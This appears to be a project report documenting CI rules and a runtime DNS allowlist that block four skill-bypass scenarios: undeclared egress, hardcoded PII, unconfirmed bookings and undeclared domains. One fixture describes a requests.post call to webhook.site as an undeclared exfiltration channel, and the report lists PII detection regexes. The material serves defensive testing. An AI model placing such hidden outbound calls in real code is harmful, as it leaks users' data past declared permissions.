# M1-D: Security Proof — 4 Bypass Scenarios

**Date:** 2026-02-26
**Status:** All 4 scenarios proven with test fixtures + CI evidence + integration tests

---

## Scenario 1: Undeclared Egress Blocked by CI (TRAVEL-002)

**Threat:** A skill PR declares one egress domain in `skill.yaml` but calls an undeclared domain in source code.

**Rule:** `TRAVEL-002` in `scripts/travel-rules-check.py` (L223-355)
- Scans source files for HTTP patterns (fetch, requests, urllib, etc.)
- Extracts domain names from URLs
- Blocks any domain called in code that isn't declared in `permissions.network.egress`

**Test fixture:** `tests/fixtures/bad-egress/`
- `skill.yaml`: declares only `partners.api.skyscanner.net`
- `src/main.py`: calls `requests.post("https://webhook.site/abc123", ...)` — undeclared

**Evidence:**
```
$ bash scripts/test-travel-rules.sh
TRAVEL-002: Undeclared egress — exit code 1 (expected 1) ✓
```

**CI gate:** `travel-rules` job in `.github/workflows/stopcrabs-gate.yml`

---

## Scenario 2: Hardcoded PII Blocked by CI (TRAVEL-001)

**Threat:** A skill PR contains hardcoded personally identifiable information (emails, phone numbers, passport numbers, credit card numbers).

**Rule:** `TRAVEL-001` in `scripts/travel-rules-check.py` (L128-216)
- Email regex: `[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`
- Phone regex: `\+?\d[\d\s\-()]{7,}\d`
- Passport/ID regex: `\b[A-Z]{1,2}\d{6,9}\b`
- Credit card regex: `\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`
- PII field names: passport, ssn, social_security, date_of_birth, credit_card, card_number, cvv, national_id

**Test fixture:** `tests/fixtures/bad-pii/`
- `src/main.py`: contains `john.doe@example.com`, `+1-555-123-4567`, `AB1234567`, `passport_number`, `credit_card`

**Evidence:**
```
$ bash scripts/test-travel-rules.sh
TRAVEL-001: PII detected — exit code 1 (expected 1) ✓
```

---

## Scenario 3: Booking Without Confirmation Blocked by CI (TRAVEL-003)

**Threat:** A skill PR has booking capability (`C-BOOKING-TXN`) with `risk_level: "low"` and performs transactions without requiring user confirmation.

**Rule:** `TRAVEL-003` in `scripts/travel-rules-check.py` (L362-434)
- Checks: manifest has `C-BOOKING-TXN` capability AND `risk_level: "low"` → BLOCK
- Scans for transaction keywords: purchase, checkout, pay, charge, reserve, confirm_booking, place_order, submit_payment
- Requires confirmation patterns: confirm, user_confirm, await_confirmation, require_approval, human_in_the_loop

**Test fixture:** `tests/fixtures/bad-booking/`
- `skill.yaml`: `capabilities: [C-BOOKING-TXN]`, `risk_level: "low"`
- `src/main.py`: `def book_flight(...)` with `requests.post(...purchase...)` — no confirmation pattern

**Evidence:**
```
$ bash scripts/test-travel-rules.sh
TRAVEL-003: Booking without confirmation — exit code 1 (expected 1) ✓
```

---

## Scenario 4: Undeclared Domain Blocked at Runtime by SkillRunner

**Threat:** A skill passes CI review but at runtime attempts to reach a domain not declared in its manifest.

**Mechanism:** DNS-based egress allowlisting in `packages/skill-runner/src/network.ts`
1. Create temporary Docker bridge network per execution
2. Pre-resolve declared domains to IPs on host
3. Inject via `--add-host=domain:ip` (only declared domains resolve)
4. Set `--dns=127.0.0.1` (dead loopback DNS — undeclared domains fail resolution)
5. `--cap-drop=ALL` (prevents raw socket DNS bypass)
6. Network destroyed in `finally` block (cleanup guarantee)

**Test fixtures:**
- `egress-skill/`: declares `httpbin.org` only
- `multi-egress-skill/`: declares `httpbin.org` + `example.com`
- `echo-skill/`: zero egress (`egress: []`) — runs offline

**Integration tests** (`tests/egress-integration.test.ts`, 18 tests):

| Test | Result |
|------|--------|
| Declared domain (httpbin.org) is reachable | `reachable: true, status: 200` |
| Undeclared domain (google.com) is blocked | `reachable: false` |
| Undeclared domain DNS resolution fails | `resolved: false` |
| Mix: declared succeeds, undeclared fails | httpbin.org OK, github.com blocked |
| Localhost HTTP blocked | `reachable: false` |
| host.docker.internal blocked | `reachable: false` |
| Empty egress runs with --network=none | Executes successfully offline |
| No orphan networks after success | Network count unchanged |
| No orphan networks after timeout | Cleanup despite failure |
| Multiple sequential executions cleanup | All networks cleaned |

**Evidence:** 83 tests passing across 8 test files (commit `277823e`)

---

## Summary

| # | Scenario | Gate | Evidence | Status |
|---|----------|------|----------|--------|
| 1 | Undeclared egress in PR | CI (TRAVEL-002) | bad-egress fixture → exit 1 | PROVEN |
| 2 | Hardcoded PII in PR | CI (TRAVEL-001) | bad-pii fixture → exit 1 | PROVEN |
| 3 | Booking without confirmation | CI (TRAVEL-003) | bad-booking fixture → exit 1 | PROVEN |
| 4 | Undeclared domain at runtime | SkillRunner (DNS) | 18 integration tests | PROVEN |

**CI run confirming gates 1-3:** https://github.com/prosy/travel-aw-skills/actions/runs/22335665571

**All four bypass scenarios are blocked. M1-D is complete.**
